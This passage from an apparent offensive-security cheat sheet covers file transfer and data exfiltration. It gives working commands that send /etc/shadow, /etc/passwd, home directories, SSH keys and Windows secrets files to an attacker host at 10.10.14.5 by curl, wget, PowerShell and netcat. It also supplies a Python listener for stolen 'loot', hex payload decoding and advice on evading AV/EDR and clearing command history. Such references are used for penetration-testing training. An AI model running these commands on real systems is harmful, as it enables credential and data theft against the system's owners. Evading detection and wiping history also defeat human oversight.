  certutil -hashfile payload.exe MD5

  :: Cleanup
  del encoded.b64
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Encode for Exfil"}
  ```powershell [PowerShell]
  # Encode file on Windows target (for exfiltration)
  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\admin\secrets.db"))

  # certutil encode
  certutil -encode C:\sensitive\data.db encoded.b64
  type encoded.b64
  ```
  :::
::

::note
Base64 encoding increases file size by approximately **33%**. For large files (>1MB), this method becomes impractical. Use network-based transfers for larger payloads.
::

---

### Hex Encoded Transfer

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="Encoding" color="blue"}
  :badge{label="Alternative" color="orange"}
::

When Base64 tools are unavailable, hex encoding is a universal alternative.

```bash [Linux — Encode]
# Encode to hex
xxd -p payload.elf | tr -d '\n'

# Encode with od
od -A n -t x1 payload.elf | tr -d ' \n'
```

```bash [Linux — Decode]
# Decode from hex
echo "7f454c46..." | xxd -r -p > payload.elf
chmod +x payload.elf
```

```powershell [Windows — Decode]
# PowerShell hex decode
$hex = "4d5a90000300000004000000..."
$bytes = [byte[]]::new($hex.Length / 2)
for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
}
[IO.File]::WriteAllBytes("C:\Temp\payload.exe", $bytes)
```

---

## :icon{name="i-lucide-upload"} Exfiltration — Upload from Target

### HTTP POST Exfiltration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="Upload" color="blue"}
  :badge{label="HTTP" color="orange"}
  :badge{label="Exfiltration" color="red"}
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attacker Listener"}
  ```bash [Terminal]
  # Python upload server
  cat << 'EOF' > upload_server.py
  import http.server
  import os

  class UploadHandler(http.server.BaseHTTPRequestHandler):
      def do_POST(self):
          content_length = int(self.headers['Content-Length'])
          data = self.rfile.read(content_length)
          filename = self.path.strip('/')
          if not filename:
              filename = 'exfil_data.bin'
          
          os.makedirs('loot', exist_ok=True)
          filepath = os.path.join('loot', filename)
          
          with open(filepath, 'wb') as f:
              f.write(data)
          
          print(f"[+] Received: {filepath} ({len(data)} bytes)")
          self.send_response(200)
          self.end_headers()
          self.wfile.write(b"OK")

      def log_message(self, format, *args):
          return  # Suppress default logging

  server = http.server.HTTPServer(('0.0.0.0', 80), UploadHandler)
  print("[*] Upload server listening on port 80...")
  server.serve_forever()
  EOF

  python3 upload_server.py
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Linux Target"}
  ```bash [Terminal]
  # curl POST upload
  curl -X POST http://10.10.14.5/passwd -d @/etc/passwd

  # curl with file
  curl -F "file=@/etc/shadow" http://10.10.14.5/upload

  # wget POST
  wget --post-file=/etc/shadow http://10.10.14.5/shadow

  # tar + curl (multiple files)
  tar czf - /home/ /etc/shadow /root/ 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/loot.tar.gz
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Windows Target"}
  ```powershell [PowerShell]
  # PowerShell upload
  Invoke-WebRequest -Uri http://10.10.14.5/loot -Method POST -InFile C:\Users\admin\Desktop\passwords.txt

  # WebClient upload
  (New-Object Net.WebClient).UploadFile('http://10.10.14.5/upload', 'C:\secrets.db')

  # Upload string content
  $data = Get-Content C:\Users\admin\Desktop\flag.txt -Raw
  Invoke-WebRequest -Uri http://10.10.14.5/flag.txt -Method POST -Body $data
  ```
  :::
::

---

### Netcat Exfiltration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="Upload" color="blue"}
  :badge{label="Raw TCP" color="orange"}
  :badge{label="Compress" color="red"}
::

```bash [Terminal]
# ──── Attacker: Listen for incoming data ────
nc -lvnp 443 > loot.tar.gz

# ──── Target: Send compressed archive ────
tar czf - /home /etc/shadow /var/log 2>/dev/null | nc 10.10.14.5 443

# Send single file
nc 10.10.14.5 443 < /etc/shadow

# Send directory listing
find / -name "*.conf" -o -name "*.bak" -o -name "id_rsa" 2>/dev/null | nc 10.10.14.5 443

# Send command output
cat /etc/shadow | nc 10.10.14.5 443
```

---

## :icon{name="i-lucide-shield-check"} Integrity Verification

Always verify file integrity after transfer to ensure no corruption occurred.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Linux"}
  ```bash [Terminal]
  # MD5
  md5sum payload.elf

  # SHA256 (preferred)
  sha256sum payload.elf

  # SHA1
  sha1sum payload.elf

  # Compare both sides
  # Attacker:  sha256sum payload.elf → abc123...
  # Target:    sha256sum payload.elf → abc123... ✓
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Windows"}
  ```powershell [PowerShell]
  # PowerShell
  Get-FileHash C:\Temp\payload.exe -Algorithm SHA256
  Get-FileHash C:\Temp\payload.exe -Algorithm MD5

  # certutil
  certutil -hashfile C:\Temp\payload.exe MD5
  certutil -hashfile C:\Temp\payload.exe SHA256
  ```
  :::
::

---

## :icon{name="i-lucide-list-checks"} Method Selection Guide

Choose the right transfer method based on the target environment:

::steps{level="4"}

#### Assess Available Tools

```bash [Linux Target]
which wget curl nc ncat python python3 perl ruby php lua openssl
```

```powershell [Windows Target]
where curl.exe certutil bitsadmin powershell
Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
```

#### Check Network Restrictions

```bash [Terminal]
# Test outbound connectivity
curl -s http://10.10.14.5/test
nc -zv 10.10.14.5 80
nc -zv 10.10.14.5 443
nc -zv 10.10.14.5 53
```

#### Choose Based on Situation

| Scenario | Best Method |
| -------- | ----------- |
| Full network access | `wget` / `curl` / `PowerShell IWR` |
| Only port 80/443 open | HTTP-based transfers |
| Only port 53 open | DNS exfiltration |
| Only SMB allowed | `impacket-smbserver` |
| No outbound HTTP | Base64 copy-paste |
| Need stealth | `curl.exe` (Win) / `/dev/tcp` (Linux) |
| PowerShell blocked | `certutil` / `cscript` / `curl.exe` |
| All tools removed | `/dev/tcp` / `awk` / Base64 echo |
| SSH access available | `scp` / `sftp` |
| Need encryption | `openssl` / `ncat --ssl` / `scp` |

#### Verify and Execute

```bash [Terminal]
# After transfer, always verify
sha256sum payload.elf   # Linux
certutil -hashfile payload.exe SHA256   # Windows

# Set permissions (Linux)
chmod +x payload.elf
```

::

---

## Detection & OPSEC Considerations

::card-group
  ::card
  ---
  title: High Detection Risk
  icon: i-lucide-shield-alert
  color: red
  ---
  `certutil -urlcache`, `mshta`, `IEX(DownloadString)`, `bitsadmin`, `rundll32` with URLs — all heavily flagged by AV/EDR. Use only when stealth is not required.
  ::

  ::card
  ---
  title: Medium Detection Risk
  icon: i-lucide-shield
  color: orange
  ---
  `PowerShell Invoke-WebRequest`, `wget.exe`, scripting language downloads — logged but may not trigger immediate alerts depending on EDR configuration.
  ::

  ::card
  ---
  title: Lower Detection Risk
  icon: i-lucide-shield-check
  color: green
  ---
  `curl.exe` (native), `scp/sftp`, `openssl s_client`, SMB file access, Base64 decode — less commonly monitored by default security tools.
  ::

  ::card
  ---
  title: OPSEC Tips
  icon: i-lucide-eye-off
  color: blue
  ---
  Use HTTPS over HTTP. Avoid writing to disk when possible. Clean up transferred files. Use common ports (80/443). Match User-Agent strings to environment.
  ::
::

::tip
**Clean up after yourself.** Remove transferred tools, clear command history (`history -c`, `Remove-Item (Get-PSReadlineOption).HistorySavePath`), and delete temporary files after use.
::

::card-group
  ::card
  ---
  title: GTFOBins
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+file%20download
  target: _blank
  ---
  Linux binaries that can be exploited for file downloads and uploads — searchable by capability.
  ::

  ::card
  ---
  title: LOLBAS Project
  icon: i-lucide-terminal
  to: https://lolbas-project.github.io/#/download
  target: _blank
  ---
  Living Off The Land Binaries, Scripts, and Libraries for Windows file transfer techniques.
  ::

  ::card
  ---
  title: HackTricks — File Transfers
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/exfiltration.html
  target: _blank
  ---
  Comprehensive exfiltration and file transfer reference from HackTricks.
  ::

  ::card
  ---
  title: PayloadsAllTheThings
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
  target: _blank
  ---
  Community-maintained payload repository with Windows download and execute techniques.
  ::
::
